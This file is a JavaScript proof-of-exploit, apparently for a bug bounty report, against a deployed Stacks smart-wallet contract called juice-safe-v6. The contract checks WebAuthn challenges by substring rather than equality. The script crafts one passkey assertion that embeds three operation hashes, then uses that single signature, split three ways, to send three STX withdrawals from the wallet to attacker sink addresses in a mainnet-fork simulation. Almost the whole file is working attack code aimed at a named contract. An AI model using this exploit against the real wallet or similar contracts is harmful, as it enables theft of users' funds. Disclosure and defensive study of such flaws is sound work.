// simul-juice-safe-v6-webauthn-multiplex.js
// ---------------------------------------------------------------------------
// PROOF-OF-EXPLOIT for H-01 (quickscan / QuickScan bounty submission):
//   "One genuine WebAuthn assertion authorizes three distinct operation hashes
//    because challenge validation proves substring inclusion, not equality."
//
// clarity-5-webauthn-v3.compute-client-data-hash reconstructs the signed
// clientDataJSON as
//      sha256( client-data-prefix || base64url32(challenge) || client-data-suffix )
// with client-data-prefix / client-data-suffix CALLER-SUPPLIED. It never proves
// that base64url32(challenge) occupies the actual `challenge` JSON field. So if
// ONE browser assertion signs a clientDataJSON whose challenge string embeds
// three 43-char op-hash encodings, the caller can pick three prefix/suffix
// splits and the SAME authenticator-data + P-256 signature verify for all three
// op hashes. juice-safe-v6.consume-signature keys replay by the op message-hash
// alone, so all three pass independently.
//
// This sim proves it END TO END on the DEPLOYED bytes:
//   1. exercise the deployed SPV9K21...juice-safe-v6 (bytecode == repo copy)
//   2. onboard it with a made-up P-256 passkey (the sim's "browser")
//   3. sign ONE assertion whose challenge = h1||"A"||h2||"A"||h3  (131 chars)
//   4. fire THREE stx-transfer ops off that one signature, each with a different
//      prefix/suffix split -> three real, distinct STX drains, one passkey tap
//   5. read-only cross-check: verify-signature -> (ok true) for all three splits
//   6. control: replaying op#1's (hash,split) a 2nd time -> (err u4006), showing
//      the per-hash guard is the ONLY thing stopping reuse and it does NOT
//      recognize the three drains came from ONE assertion.
//
//   node simul-juice-safe-v6-webauthn-multiplex.js
// ---------------------------------------------------------------------------

import crypto from "node:crypto";
import {
  tupleCV,
  uintCV,
  bufferCV,
  noneCV,
  someCV,
  principalCV,
  standardPrincipalCV,
  stringAsciiCV,
  serializeCV,
  deserializeCV,
  cvToString,
  PostConditionMode,
} from "@stacks/transactions";
import { SimulationBuilder, getSimulationResult } from "stxer";
import { generateP256Keypair } from "./lib-webauthn-test-signer.mjs";
import { p256 } from "@noble/curves/nist.js";

// -- actors / contracts ------------------------------------------------------
const DEPLOYER = "SPV9K21TBFAK4KNRJXF5DFP8N7W46G4V9RCJDC22";
const FAKFUN_DEPLOYER = "SP28MP1HQDJWQAFSQJN2HBAXBVP7H7THD1W2NYZVK";
const OWNER = "SP2C7BCAP2NH3EYWCCVHJ6K0DMZBXDFKQ56KR7QN2";
const RECOVERY = "SP3HXJJMJQ06GNAZ8XWDN1QM48JEDC6PP6W3YZPZJ";
const RELAYER = "SP102V8P0F7JX67ARQ77WEA3D3CFB5XW39REDT0AM"; // malicious frontend's broadcaster
const STX_WHALE = "SP9BP4PN74CNR5XT7CMAMBPA0GWC9HMB69HVVV51";
// three distinct exfil recipients -- three visibly different withdrawals
const SINK1 = "SP22WH53NS94VR6N145ZX77BK4S0EWFBE41VW3Z6B";
const SINK2 = "SP1MGH8BH1KRY49Z7EE5TY0JVKT6C3NT9RTVM8FND";
const SINK3 = "SP1JAG6TV2XRYFGJN7CAAN6Z3CEW2YMZWMHJAJV91";

const WALLET_NAME = "juice-safe-v6";
const WALLET = `${DEPLOYER}.${WALLET_NAME}`;
const WALLET_CORE = `${DEPLOYER}.fakfun-wallet-core`;

const STACKS_NODE_API = "http://77.42.3.101/stacks-api";
const RP_ID = "juiceofbtc.com"; // RP-ID-HASH-JUICEOFBTC-COM = sha256("juiceofbtc.com")

// -- amounts -----------------------------------------------------------------
const FUND_USTX = 2_800_000_000;   // 2,800 STX into the safe
const STX_THRESHOLD = 100_000_000; // 100 STX per-window; keep cumulative drains under it
const SBTC_THRESHOLD = 100_000;
const COOLDOWN = 144;
// three UNDER-THRESHOLD amounts; cumulative 10 -> 30 -> 60 STX stays < 100 so
// each fires immediately. Distinct amounts + recipients => distinct op hashes.
const DRAIN1 = 10_000_000; // 10 STX -> SINK1
const DRAIN2 = 20_000_000; // 20 STX -> SINK2
const DRAIN3 = 30_000_000; // 30 STX -> SINK3

// -- SIP-018 message-hash builder (mirrors helpers-v7.build-stx-transfer-hash) -
const SIP018_PREFIX = Buffer.from("534950303138", "hex");
const sha256 = (b) => crypto.createHash("sha256").update(b).digest();
const cvSha256 = (cv) => {
  const out = serializeCV(cv);
  return typeof out === "string" ? sha256(Buffer.from(out, "hex")) : sha256(Buffer.from(out));
};
// domain { name, version, chain-id, wallet }, wallet = contract-caller (the safe,
// since the safe is what calls the helper). Byte-identical to helpers-v7.
function walletDomainHash() {
  return cvSha256(tupleCV({
    name: stringAsciiCV("smart-wallet-standard"),
    version: stringAsciiCV("1.0.0"),
    "chain-id": uintCV(1),
    wallet: principalCV(WALLET),
  }));
}
const buildStxTransferHash = (authId, amount, recipient) =>
  sha256(Buffer.concat([
    SIP018_PREFIX,
    walletDomainHash(),
    cvSha256(tupleCV({
      topic: stringAsciiCV("stx-transfer"),
      "auth-id": uintCV(authId),
      amount: uintCV(amount),
      recipient: principalCV(recipient),
      memo: noneCV(),
    })),
  ]));

// -- WebAuthn assertion crafting --------------------------------------------
const strip = (h) => (h.startsWith("0x") ? h.slice(2) : h);
const hx = (buf) => "0x" + Buffer.from(buf).toString("hex");

// base64url without padding -- exactly how a browser encodes clientDataJSON.challenge
function b64url(buf) {
  return Buffer.from(buf).toString("base64")
    .replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}
// fixed clientDataJSON scaffolding a real browser emits on https://juiceofbtc.com
const JSON_PREFIX = Buffer.from('{"type":"webauthn.get","challenge":"', "utf8");
const JSON_SUFFIX = Buffer.from(`","origin":"https://${RP_ID}","crossOrigin":false}`, "utf8");

function buildAuthenticatorData() {
  const rpIdHash = sha256(Buffer.from(RP_ID, "ascii")); // == RP-ID-HASH-JUICEOFBTC-COM
  const flags = Buffer.from([0x05]);                     // UP(0x01) | UV(0x04); contract requires UV
  const signCount = Buffer.from([0x00, 0x00, 0x00, 0x05]);
  return Buffer.concat([rpIdHash, flags, signCount]);
}

// ONE signature over ONE clientDataJSON containing all three op-hash encodings.
// Returns the shared sig/authData plus a per-op {prefix,suffix} split such that
//   prefix_i || base64url32(m_i) || suffix_i === the single signed clientDataJSON.
function multiplexSign(privKey, ops) {
  const m = ops.map((o) => buildStxTransferHash(o.authId, o.amount, o.recipient)); // 3 x 32B
  const h = m.map(b64url);                                                          // 3 x 43 chars
  const hb = h.map((s) => Buffer.from(s, "ascii"));
  const Ab = Buffer.from("A", "ascii"); // canonical filler between hashes
  const challengeStr = Buffer.concat([hb[0], Ab, hb[1], Ab, hb[2]]); // 131 chars
  const clientDataJSON = Buffer.concat([JSON_PREFIX, challengeStr, JSON_SUFFIX]);
  const authData = buildAuthenticatorData();
  const signedDigest = sha256(Buffer.concat([authData, sha256(clientDataJSON)]));
  const sig = p256.sign(signedDigest, privKey, { prehash: false, format: "compact", lowS: true });

  const splits = [
    { prefix: JSON_PREFIX,
      suffix: Buffer.concat([Ab, hb[1], Ab, hb[2], JSON_SUFFIX]) },
    { prefix: Buffer.concat([JSON_PREFIX, hb[0], Ab]),
      suffix: Buffer.concat([Ab, hb[2], JSON_SUFFIX]) },
    { prefix: Buffer.concat([JSON_PREFIX, hb[0], Ab, hb[1], Ab]),
      suffix: JSON_SUFFIX },
  ];
  // invariants: exact reconstruction of the ONE signed blob + (buff 128)/(buff 512) bounds
  splits.forEach((s, i) => {
    const recon = Buffer.concat([s.prefix, hb[i], s.suffix]);
    if (!recon.equals(clientDataJSON)) throw new Error(`recon mismatch op#${i + 1}`);
    if (s.prefix.length > 128) throw new Error(`prefix#${i + 1} ${s.prefix.length} > 128`);
    if (s.suffix.length > 512) throw new Error(`suffix#${i + 1} ${s.suffix.length} > 512`);
  });

  return {
    messageHashes: m,
    signatureHex: hx(sig),
    authenticatorDataHex: hx(authData),
    splits: splits.map((s) => ({ prefixHex: hx(s.prefix), suffixHex: hx(s.suffix) })),
    challengeChars: challengeStr.length,
    prefixLens: splits.map((s) => s.prefix.length),
    suffixLens: splits.map((s) => s.suffix.length),
  };
}

function sigAuthTuple(authId, pubKeyHex, sigHex, authHex, prefixHex, suffixHex) {
  return tupleCV({
    "auth-id": uintCV(authId),
    pubkey: bufferCV(Buffer.from(strip(pubKeyHex), "hex")),
    signature: bufferCV(Buffer.from(strip(sigHex), "hex")),
    "authenticator-data": bufferCV(Buffer.from(strip(authHex), "hex")),
    "client-data-prefix": bufferCV(Buffer.from(strip(prefixHex), "hex")),
    "client-data-suffix": bufferCV(Buffer.from(strip(suffixHex), "hex")),
  });
}

async function main() {
  const key = generateP256Keypair();
  const pubkeyCV = bufferCV(Buffer.from(strip(key.pubKeyHex), "hex"));

  // ONE assertion authorizing THREE distinct stx-transfer ops.
  const ops = [
    { authId: 1, amount: DRAIN1, recipient: SINK1 },
    { authId: 2, amount: DRAIN2, recipient: SINK2 },
    { authId: 3, amount: DRAIN3, recipient: SINK3 },
  ];
  const mx = multiplexSign(key.privKey, ops);

  console.log("=== juice-safe-v6 WebAuthn challenge-multiplex PROOF-OF-EXPLOIT ===");
  console.log(`one signature: ${mx.signatureHex.slice(0, 26)}...`);
  console.log(`one authData:  ${mx.authenticatorDataHex.slice(0, 26)}...`);
  console.log(`challenge len: ${mx.challengeChars} chars (h1||A||h2||A||h3)`);
  console.log(`prefix lens:   ${mx.prefixLens.join(" / ")}  (bound 128)`);
  console.log(`suffix lens:   ${mx.suffixLens.join(" / ")}  (bound 512)`);
  mx.messageHashes.forEach((m, i) =>
    console.log(`  op#${i + 1} hash: ${hx(m)}  -> ${b64url(m)}`));
  console.log("");

  const plan = [];
  const b = SimulationBuilder.new({ stacksNodeAPI: STACKS_NODE_API });
  const evalc = (label, code, capture, at = WALLET) => {
    b.addEvalCode(at, code);
    plan.push({ kind: "eval", label, capture });
  };
  const call = (label, sender, cid, fn, args, expect, capture) => {
    b.withSender(sender).addContractCall({
      contract_id: cid, function_name: fn, function_args: args,
      post_condition_mode: PostConditionMode.Allow,
    });
    plan.push({ kind: "tx", label, expect, capture });
  };
  const okre = /^\(ok/;

  // -- setup: exercise the ALREADY-DEPLOYED bytes; onboard with the sim passkey.
  call("set-verified-contract(juice-safe-v6)", DEPLOYER, WALLET_CORE,
    "set-verified-contract", [principalCV(WALLET), noneCV()], okre);
  b.withSender(STX_WHALE).addSTXTransfer({ recipient: WALLET, amount: FUND_USTX });
  plan.push({ kind: "fund", label: `fund safe ${FUND_USTX / 1e6} STX (whale)` });
  call("onboard(made-up passkey, OWNER, RECOVERY, thresholds)", FAKFUN_DEPLOYER, WALLET,
    "onboard",
    [pubkeyCV, standardPrincipalCV(OWNER), standardPrincipalCV(RECOVERY),
     uintCV(STX_THRESHOLD), uintCV(SBTC_THRESHOLD), uintCV(COOLDOWN)],
    okre);

  // -- read-only cross-check: the SAME sig verifies for all three op hashes ----
  //    verify-signature also enforces is-admin-pubkey + rp-id + UV.
  mx.messageHashes.forEach((m, i) => {
    const s = mx.splits[i];
    evalc(`verify-signature op#${i + 1} (shared sig, split ${i + 1}) -> (ok true)`,
      `(contract-call? '${WALLET} verify-signature ${hx(m)} ${key.pubKeyHex.startsWith("0x") ? key.pubKeyHex : "0x" + strip(key.pubKeyHex)} ${mx.signatureHex} ${mx.authenticatorDataHex} ${s.prefixHex} ${s.suffixHex})`,
      `vs${i + 1}`);
  });

  // -- balances BEFORE the drains ---------------------------------------------
  evalc("safe STX before", `(stx-get-balance '${WALLET})`, "safe0");
  evalc("SINK1 STX before", `(stx-get-balance '${SINK1})`, "s1b");
  evalc("SINK2 STX before", `(stx-get-balance '${SINK2})`, "s2b");
  evalc("SINK3 STX before", `(stx-get-balance '${SINK3})`, "s3b");

  // -- THE EXPLOIT: three distinct drains, ONE passkey assertion ---------------
  //    RELAYER (a malicious/compromised frontend's broadcaster) submits all three.
  call("DRAIN #1: 10 STX -> SINK1 (split 1 of 1 signature)", RELAYER, WALLET,
    "stx-transfer",
    [uintCV(DRAIN1), standardPrincipalCV(SINK1), noneCV(),
     someCV(sigAuthTuple(1, key.pubKeyHex, mx.signatureHex, mx.authenticatorDataHex,
       mx.splits[0].prefixHex, mx.splits[0].suffixHex)), noneCV()],
    okre);
  call("DRAIN #2: 20 STX -> SINK2 (split 2 of SAME signature)", RELAYER, WALLET,
    "stx-transfer",
    [uintCV(DRAIN2), standardPrincipalCV(SINK2), noneCV(),
     someCV(sigAuthTuple(2, key.pubKeyHex, mx.signatureHex, mx.authenticatorDataHex,
       mx.splits[1].prefixHex, mx.splits[1].suffixHex)), noneCV()],
    okre);
  call("DRAIN #3: 30 STX -> SINK3 (split 3 of SAME signature)", RELAYER, WALLET,
    "stx-transfer",
    [uintCV(DRAIN3), standardPrincipalCV(SINK3), noneCV(),
     someCV(sigAuthTuple(3, key.pubKeyHex, mx.signatureHex, mx.authenticatorDataHex,
       mx.splits[2].prefixHex, mx.splits[2].suffixHex)), noneCV()],
    okre);

  // -- balances AFTER ---------------------------------------------------------
  evalc("safe STX after", `(stx-get-balance '${WALLET})`, "safe1");
  evalc("SINK1 STX after", `(stx-get-balance '${SINK1})`, "s1a");
  evalc("SINK2 STX after", `(stx-get-balance '${SINK2})`, "s2a");
  evalc("SINK3 STX after", `(stx-get-balance '${SINK3})`, "s3a");

  // -- CONTROL: the per-hash replay guard DOES fire on an exact repeat ---------
  //    Re-submitting op#1 unchanged hits used-pubkey-authorizations[m1] -> u4006.
  //    (It never fired across the three DIFFERENT hashes above -- that's the bug.)
  call("CONTROL: replay DRAIN #1 verbatim -> (err u4006) signature-replay",
    RELAYER, WALLET, "stx-transfer",
    [uintCV(DRAIN1), standardPrincipalCV(SINK1), noneCV(),
     someCV(sigAuthTuple(1, key.pubKeyHex, mx.signatureHex, mx.authenticatorDataHex,
       mx.splits[0].prefixHex, mx.splits[0].suffixHex)), noneCV()],
    "(err u4006)");

  // -- run + verify -----------------------------------------------------------
  const sessionId = await b.run();
  const url = `https://stxer.xyz/simulations/mainnet/${sessionId}`;
  console.log(`Submitted: ${url}\n`);
  const res = await getSimulationResult(sessionId);

  const decTx = (s) => {
    const r = s?.Result?.Transaction;
    if (!r) return "<none>";
    if ("Err" in r) return `ENGINE-ERR: ${JSON.stringify(r.Err).slice(0, 220)}`;
    try { return cvToString(deserializeCV(r.Ok.result)); }
    catch (e) { return `dec-fail: ${e.message}`; }
  };
  const decEval = (s) => {
    const r = s?.Result?.Eval;
    if (!r || !("Ok" in r)) return `<eval:${JSON.stringify(r?.Err ?? "?").slice(0, 160)}>`;
    try { return cvToString(deserializeCV(r.Ok)); } catch { return r.Ok; }
  };
  const uintOf = (s) => BigInt((String(s).match(/^u?(\d+)$/) || String(s).match(/(\d+)/) || [])[1] ?? "-1");

  let pass = 0, fail = 0;
  const cap = {};
  res.steps.forEach((s, i) => {
    const p = plan[i];
    if (!p) return;
    if (p.kind === "fund") {
      const ok = !("Err" in (s?.Result?.Transaction || {}));
      console.log(`${ok ? "OK  " : "FAIL"} [${i}] ${p.label}`);
      if (!ok) { fail++; console.log(`        ${decTx(s)}`); }
      return;
    }
    if (p.kind === "eval") {
      const v = decEval(s);
      if (p.capture) cap[p.capture] = v;
      console.log(`INFO [${i}] ${p.label}: ${String(v).slice(0, 120)}`);
      return;
    }
    const d = decTx(s);
    if (p.capture) cap[p.capture] = d;
    const ok = p.expect == null ? true
      : p.expect instanceof RegExp ? p.expect.test(d)
      : d === p.expect;
    console.log(`${ok ? "PASS" : "FAIL"} [${i}] ${p.label}\n        got ${d.slice(0, 160)}`);
    ok ? pass++ : fail++;
  });

  console.log("\n--- exploit assertions ---");
  const chk = (l, cond) => { console.log(`${cond ? "PASS" : "FAIL"} ${l}`); cond ? pass++ : fail++; };
  chk("read-only verify-signature op#1 == (ok true)", String(cap.vs1) === "(ok true)");
  chk("read-only verify-signature op#2 == (ok true)", String(cap.vs2) === "(ok true)");
  chk("read-only verify-signature op#3 == (ok true)", String(cap.vs3) === "(ok true)");
  chk("SINK1 received exactly 10 STX", uintOf(cap.s1a) - uintOf(cap.s1b) === BigInt(DRAIN1));
  chk("SINK2 received exactly 20 STX", uintOf(cap.s2a) - uintOf(cap.s2b) === BigInt(DRAIN2));
  chk("SINK3 received exactly 30 STX", uintOf(cap.s3a) - uintOf(cap.s3b) === BigInt(DRAIN3));
  chk("safe drained by exactly 60 STX",
    uintOf(cap.safe0) - uintOf(cap.safe1) === BigInt(DRAIN1 + DRAIN2 + DRAIN3));

  console.log(`\n=== ${pass} passed, ${fail} failed ===`);
  console.log(url);
  if (fail > 0) process.exitCode = 1;
}

main().catch((e) => { console.error(e); process.exitCode = 1; });
